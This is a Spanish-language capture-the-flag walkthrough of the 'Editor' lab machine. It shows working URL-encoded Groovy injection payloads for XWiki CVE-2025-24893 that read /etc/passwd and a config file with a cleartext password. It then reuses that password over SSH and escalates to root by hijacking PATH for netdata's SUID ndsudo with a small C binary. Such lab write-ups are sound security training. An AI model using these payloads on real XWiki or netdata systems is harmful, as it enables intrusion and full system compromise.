# EDITOR

<img width="669" height="490" alt="image" src="https://github.com/user-attachments/assets/92eda184-3b44-43fc-8885-5cf64a663b39" />

# Reconocimiento

```bash
nmap -Pn -n -sS -p- -sCV --min-rate 5000 10.10.11.80 -oN nmap.txt
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 11:20 -03
Nmap scan report for 10.10.11.80
Host is up (0.15s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   Server Type: Jetty(10.0.20)
|_  WebDAV type: Unknown
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
|_http-server-header: Jetty(10.0.20)
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds

```

agregamos el dominio reportado por `nmap` a `/etc/hosts`

```bash
echo '10.10.11.80 editor.htb' >> /etc/hosts
```

accedemos a servicio web

<img width="1920" height="1055" alt="image" src="https://github.com/user-attachments/assets/557ef8c3-71b9-43f1-bdc5-42f4c89c39b6" />

y ahora accedemos al puerto `8080`


<img width="1920" height="1010" alt="image" src="https://github.com/user-attachments/assets/3dbf8037-39ea-440c-9953-e2339b581eda" />

observamos al final informacion de posible interes `XWiki Debian 15.10.8 ` asi que buscamos informacion en la web y conseguimos un exploit para obtener `rce`

<img width="1920" height="1010" alt="image" src="https://github.com/user-attachments/assets/e05f7897-58ec-4b82-bcdc-104844e6ee44" />

>>> Version vulnerable al CVE-2025-24893

Testeo el exploit pero al parecer no me funciona asi que continuo buscando informacion sobre el `CVE-2025-24893` directamente y obtengo esto

<img width="1920" height="1010" alt="image" src="https://github.com/user-attachments/assets/71dccddb-3bf1-45da-a989-7f83f3d62758" />

asi que testeamos de forma manual a ver si nos funciona por lo que accedemos al siguiente link

```bash
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async%20async%3Dfalse}}{{groovy}}println(%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20(23%20%2B%2019)){{%2Fgroovy}}{{%2Fasync}}%20
```
<img width="1920" height="1055" alt="image" src="https://github.com/user-attachments/assets/4a85107b-50e9-4101-8250-72e0befe8cd8" />

parece ser que da error asi que vamos a testear con el payload del exploit que conseguimos antes

```bash
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22cat%20%2Fetc%2Fpasswd%22.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D
```
>>> Al acceder al link lo que hace es descargar un archivo
                                                                        
<img width="1920" height="1055" alt="image" src="https://github.com/user-attachments/assets/5ec60377-074a-4666-b836-86ce5d5684e3" />
 
>>> Chequeamos el archivo

<img width="1920" height="1055" alt="image" src="https://github.com/user-attachments/assets/035bcd46-c117-460d-b6f6-61334a48f824" />

se a ejecutado el comando `cat /etc/passwd`, pero tras un largo tiempo intentando obtener una revershell no lo logre asi que continue buscando informacion de `xwiki` en cuanto a sus archivos de configuracion


<img width="1920" height="952" alt="image" src="https://github.com/user-attachments/assets/f7f66cf4-149d-496d-9ce4-71beaf4f0413" />

aqui veo varios archivos de configuracion que se localizan en el directorio `WEB-INF` asi que vamos a localizar primero el directorio en el sistema

```bash
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22find%20%2F%20-name%20WEB-INF%20-type%20d%22.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D
```

>>> al acceder al link anterior ejecutamos en el sistema el comando: find / -name WEB-INF -type d

se descarga un archivo que al leerlo podemos ver donde se localiza el directorio

<img width="1920" height="1050" alt="image" src="https://github.com/user-attachments/assets/6af3afe9-a9fa-4a33-a297-981ee31cd769" />

existen 2 directorios en diferentes ubicaciones: `/usr/lib/xwiki/WEB-INF` y `/usr/lib/xwiki-jetty/webapps/root/WEB-INF`

vamos intentar leer directamente el archivo `hibernate.cfg.xml` en la ubicacion `/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml` y luego en el segundo directorio a ver si conseguimos credenciales

```bash
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22cat%20%2Fusr%2Flib%2Fxwiki%2FWEB-INF%2Fhibernate.cfg.xml%22.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D
```
>>> al acceder al link anterior se descarga un archivo con credenciales

<img width="1920" height="1050" alt="image" src="https://github.com/user-attachments/assets/4e39e931-93c3-413f-97e9-a43c596b5e94" />

>>> credenciales: xwiki:theEd1t0rTeam99

como ya sabemos que solo existe un usuario del sistema `oliver`, vamos a testear esa password por `ssh`

```bash
ssh oliver@10.10.11.80
```

<img width="1920" height="882" alt="image" src="https://github.com/user-attachments/assets/ff1c691a-c254-449e-9367-835b87d10cf3" />

>>> Hemos obtenido acceso!

# Escalada de Privilegios

### User oliver

revisando el sistema vemos un puerto inusual que esta en escucha en el localhost

```bash
netstat -tunl
```

<img width="1920" height="335" alt="image" src="https://github.com/user-attachments/assets/5507a7ce-9ac9-483f-b5d6-c3736997a3ca" />

inspeccionamos el puerto

```bash
curl 127.0.0.1:19999
```

<img width="1920" height="1005" alt="image" src="https://github.com/user-attachments/assets/9b95996d-b49b-45e6-9be4-bd379c15c088" />

parece ser un servicio web asi que vamos a redirigir un puerto de nuestra maquina atacante al puerto `19999` de la maquina remota

```bash
ssh -L 19999:127.0.0.1:19999 oliver@10.10.11.80
```
>>> Nuestro puerto local {19999} lo redirigimos hasta el puerto remoto {19999} en el localhost de la maquina remota 

💻 attack {Puerto 19999} ----- > 💻 remote {Puerto 19999}

Cuando nos conectemos a nuestro puerto local 19999 nos va a redireccionar hasta el servicio que corre en el host remoto por el puerto 19999 en el localhost

<img width="1920" height="1054" alt="image" src="https://github.com/user-attachments/assets/f8be583b-e2ef-4c1a-b2a1-7c8d3710635a" />

de entrada ya vemos una advertencia para actualizar el software por lo que buscamos la version actual

<img width="1920" height="1054" alt="image" src="https://github.com/user-attachments/assets/3c19a474-25b1-472d-8647-5898dd473186" />

localizada la version investigamos posibles vulnerabilidades

<img width="1920" height="1009" alt="image" src="https://github.com/user-attachments/assets/c6141f47-5bb0-46d6-9587-eaeba34638f4" />

conseguimos una POC, la cual nos indica que el binario `ndsudo` fue empaquetado con el bit suid activo, es decir, se ejecuta como el dueno del binario y no como el usuario que lo ejecuta y otro detalle que se menciona es
que solo ejecuta un conjunto restringido de comandos externos, pero sus rutas de búsqueda las proporciona el `PATH`, por lo que aqui tenemos la escalada a root, pasos:

1) crear un binario que ejecute un comando malicioso que nos permita escalar, pero que establezca el suid a 0
2) Modificar el PATH a un directorio controlado por nosotros
3) mover el binario malicioso a donde apunta el PATH y cambiar su nombre por un binario que ejecute la herramienta `ndsudo`
4) ejecutar `ndsudo`


>>> Binario malicioso
```bash
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    if (setuid(0) != 0) {
        perror("Error al establecer UID=0 (root)");
        return 1;
    }

    system("chmod u+s /bin/bash");

    return 0;
}
```

compilamos el binario

```bash
gcc shell.c -o shell
```

>>> una vez compilado lo pasamos a la maquina remota

Ahora Cambiamos el PATH en la maquina remota

```bash
export PATH=/home/oliver:$PATH
```

ahora vamos a ver que nombre tienen los binarios que ejecuta `ndsudo`

```bash
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo --help
```

<img width="1920" height="862" alt="image" src="https://github.com/user-attachments/assets/6a505c4f-e21c-4235-9952-6db49bacde54" />

>>> en este caso use el nombre del binario nvme

Ahora cambiamos el nombre del binario malicioso por el nombre del binario que buscara `ndsudo` y le damos permisos de ejecucion

```sudo
mv shell nvme && chmod +x nvme
```

Por ultimo ejecutamos el binario `ndsudo` y escalamos a `root`

```bash
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

<img width="1920" height="361" alt="image" src="https://github.com/user-attachments/assets/c5238886-baa3-4473-baa7-5d2ac740c17e" />

# Obtuvimos control como ROOT!!!!





